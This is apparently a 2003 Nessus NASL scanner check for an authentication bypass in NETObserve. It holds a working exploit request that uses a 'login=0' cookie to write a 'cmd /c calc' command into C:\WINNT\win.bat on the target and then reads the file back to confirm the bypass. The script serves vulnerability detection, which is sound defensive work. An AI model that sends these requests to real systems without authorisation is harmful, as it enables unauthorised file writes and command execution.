#
# This script was written by Noam Rathaus
#
# GPLv2
#
# From: Peter Winter-Smith [peter4020@hotmail.com]
# Subject: NetObserve Security Bypass Vulnerability
# Date: Tuesday 30/12/2003 01:30
#
#

if(description)
{
  script_id(11971);
  script_bugtraq_id(9319);
  script_version("$Revision: 1.4 $");
  name["english"] = "NETObserve Authentication Bypass vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
NETObserve is a solution for monitoring an otherwise unattended computer.

The product is considered as being highly insecure, as it allows the 
execution of arbitrary commands, editing and viewing of abitrary files, 
without any kind of authentication.

An attacker may use this software to gain the control on this system.


Solution: Disable this service
Risk factor: High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Detect NETObserve Security Bypass";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"This script is Copyright (C) 2003 Noam Rathaus");

  family["english"] = "Gain root remotely";
  script_family(english:family["english"]);
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

debug = 0;

port = get_http_port(default:80);


quote = raw_string(0x22);

# it is better to use http_post, but I need a special refer, and cookie content

req = string("POST /sendeditfile HTTP/1.1\r\nAccept: */*\r\nReferer: http://", get_host_name(), ":", port, "/editfile=?C:\\WINNT\\win.bat?\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: ", get_host_name(), ":", port, "\r\nConnection: close\r\nContent-Length: 25\r\nCookie: login=0\r\n\r\nnewfiledata=cmd+%2Fc+calc");
if (debug)
{
 display("req: ", req, "\n");
}

res = http_keepalive_send_recv(port:port, data:req);
if (debug)
{
 display("res: ", res, "\n");
}

if ( res == NULL ) exit(0);
find = string(" 200 OK");
find2 = string("NETObserve");
if (debug)
{
 display("find: ", find, "\n");
 display("find2: ", find2, "\n");
}

if (find >< res  && find2 >< res)
{
 if (debug)
 {
  display("----------------\n");
  display("Stage 1 complete\n");
 }

 req = string("GET /file/C%3A%5CWINNT%5Cwin.bat HTTP/1.1\r\nAccept: */*\r\nReferer: http://", get_host_name(), ":", port, "/getfile=?C:\\WINNT\\win.bat?\r\nHost: ", get_host_name(), ":", port, "\r\nConnection: close\r\nCookie: login=0\r\n\r\n");

 if (debug)
 {
  display("req: ", req, "\n");
 }
 

 res = http_keepalive_send_recv(port:port, data:req);
 if (debug)
 {
  display("res: ", res, "\n");
 }

 if ( res == NULL ) exit(0);
 find = string(" 200 OK");
 find2 = string("cmd /c calc");

 if (find >< res && find2 >< res)
 {
  security_hole(port);
  exit(0);
 }
}

